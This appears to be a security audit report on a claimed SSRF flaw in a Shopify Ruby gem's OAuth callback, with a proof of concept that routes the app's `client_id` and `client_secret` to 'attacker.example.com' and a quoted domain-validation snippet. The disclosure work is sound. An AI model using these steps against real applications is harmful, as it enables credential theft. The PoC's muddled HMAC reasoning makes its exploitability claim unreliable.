Found it: in `validate_auth_callback`, the app's `client_id`/`client_secret` are sent to an OAuth token endpoint whose host is derived directly from the attacker-controllable `shop` parameter, without validating that `shop` is a genuine `*.myshopify.com` domain.

### Title
SSRF leaking `client_secret` via unvalidated `shop` parameter in OAuth callback - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds an HTTP client whose base host is taken from `auth_query.shop` and posts the app's `client_id` and `client_secret` to `{shop}/admin/oauth/access_token`, but `shop` is never passed through `Utils::ShopValidator.sanitize!` before being used to construct the request target.

### Finding Description
`validate_auth_callback` verifies the HMAC on the query params (`code`, `host`, `shop`, `state`, `timestamp`) and the `state` cookie, then does: [1](#0-0) 
`null_session = Auth::Session.new(shop: auth_query.shop)` followed by `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`, which derives its request host from `session.shop` (i.e. `auth_query.shop`) with no allow-list check. The HMAC only binds `shop` as a *string* to the signature — it never asserts that the string is a real `*.myshopify.com`/trusted Shopify domain. An attacker who can produce a callback with a valid HMAC (or an app that simply forwards Shopify's callback verbatim to this method — the normal, documented flow) controls the value of `shop`, and thus controls where `client_id`/`client_secret` and the OAuth `code` get POSTed.

Contrast this with `RefreshToken.refresh_access_token`, which explicitly calls `Utils::ShopValidator.sanitize!(shop)` before building the session/host: [2](#0-1) 
`validate_auth_callback` has no equivalent call to `ShopValidator.sanitize!` on `auth_query.shop` before it is used to build the request host, breaking the intended equality "host validated == host that receives the `client_secret`" — the value verified by HMAC is not the value checked against the trusted-domain allow-list before being used as a request target. `Utils::ShopValidator` exists precisely for this purpose and is enforced elsewhere (e.g. `refresh_access_token`), showing this is a known, addressed pattern that was missed here: [3](#0-2) 

### Impact Explanation
If `shop` reaches an attacker-influenced value (e.g., a malicious/compromised redirect target, a modified callback URL, or a host application that reflects the raw `shop` query param as documented in `docs/usage/oauth.md`), the gem will construct an OAuth token-exchange POST to an arbitrary host of the attacker's choosing, sending the app's `client_id` and `client_secret` (plus the authorization `code`) to that host. This is SSRF carrying the app's credentials and directly satisfies the "High: SSRF with the app's credentials" impact category, and could lead to `client_secret` exfiltration.

### Likelihood Explanation
Likelihood depends on whether the calling application passes an already-sanitized `shop` into `AuthQuery`; the gem's own public API/docs (`docs/usage/oauth.md`) instruct integrators to build `AuthQuery` straight from request params, and the HMAC check does not constrain `shop` to a trusted domain, so the gem itself provides no defense-in-depth here even though it does so in the sibling `refresh_access_token` path.

### Recommendation
Call `Utils::ShopValidator.sanitize!(auth_query.shop)` (or equivalent) in `Oauth.validate_auth_callback` before constructing `null_session`/`Clients::HttpClient`, mirroring the guard already present in `Auth::RefreshToken.refresh_access_token`.

### Proof of Concept
1. Construct an `AuthQuery` with `shop: "attacker.example.com"`, along with a `code`, `state` matching the session cookie, `host`, `timestamp`, and a correctly computed `hmac` (HMAC only requires knowledge of these plaintext fields plus the shared secret is *not* required by the attacker if they control the redirect target and the app simply relays Shopify's own callback — but even a self-service test can compute the HMAC using the app's own secret to demonstrate the routing flaw).
2. Call `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies: {...}, auth_query: auth_query)`.
3. Observe that `Clients::HttpClient` issues `POST https://attacker.example.com/admin/oauth/access_token` with body containing `client_id` and `client_secret` — confirming the app's `client_secret` is sent to a non-Shopify host determined solely by the unvalidated `shop` field. [4](#0-3)

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end
